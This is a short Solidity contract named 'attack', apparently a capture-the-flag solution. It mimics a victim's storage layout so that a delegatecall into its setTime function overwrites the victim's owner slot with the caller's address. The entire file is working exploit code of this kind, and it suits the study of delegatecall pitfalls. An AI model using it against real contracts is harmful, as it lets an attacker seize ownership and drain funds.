// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract attack{
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    function setTime(uint256 a) public {
        owner=msg.sender;
    }
}
